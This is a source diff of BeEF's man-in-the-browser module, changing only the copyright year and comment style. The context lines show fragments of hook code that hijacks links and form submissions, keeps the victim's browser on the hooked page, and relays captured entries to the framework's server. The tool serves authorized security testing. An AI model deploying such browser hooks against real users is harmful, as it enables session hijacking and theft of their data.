@@ -1,15 +1,18 @@
 //
-// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 
-
+/**
+ * @namespace beef.mitb
+ */
 beef.mitb = {
 
     cid:null,
     curl:null,
 
+    /** Initializes */ 
     init:function (cid, curl) {
         beef.mitb.cid = cid;
         beef.mitb.curl = curl;
@@ -61,7 +64,7 @@ beef.mitb = {
         }
     },
 
-    // Initializes the hook on anchors and forms.
+    /** Initializes the hook on anchors and forms. */ 
     hook:function () {
         beef.onpopstate.push(function (event) {
             beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);
@@ -92,7 +95,7 @@ beef.mitb = {
         }
     },
 
-    // Hooks anchors and prevents them from linking away
+    /** Hooks anchors and prevents them from linking away */
     poisonAnchor:function (e) {
         try {
             e.preventDefault;
@@ -111,7 +114,7 @@ beef.mitb = {
         return false;
     },
 
-    // Hooks forms and prevents them from linking away
+    /** Hooks forms and prevents them from linking away */
     poisonForm:function (form) {
         form.onsubmit = function (e) {
 
@@ -154,7 +157,7 @@ beef.mitb = {
         }
     },
 
-    // Fetches a hooked form with AJAX
+    /** Fetches a hooked form with AJAX */ 
     fetchForm:function (url, query, target) {
         try {
             var y = new XMLHttpRequest();
@@ -174,7 +177,7 @@ beef.mitb = {
         }
     },
 
-    // Fetches a hooked link with AJAX
+    /** Fetches a hooked link with AJAX */
     fetch:function (url, target) {
         try {
             var y = new XMLHttpRequest();
@@ -195,7 +198,7 @@ beef.mitb = {
         }
     },
 
-    // Fetches a window.location=http://domainname.com and setting up history
+    /** Fetches a window.location=http://domainname.com and setting up history */ 
     fetchOnclick:function (url) {
         try {
             var target = document.getElementsByTagName("html")[0];
@@ -225,7 +228,7 @@ beef.mitb = {
         }
     },
 
-    // Relays an entry to the framework
+    /** Relays an entry to the framework */
     sniff:function (result) {
         try {
             beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
@@ -234,7 +237,7 @@ beef.mitb = {
         return true;
     },
 
-    // Signals the Framework that the user has lost the hook
+    /** Signals the Framework that the user has lost the hook */
     endSession:function () {
         beef.mitb.sniff("Window closed.");
     }
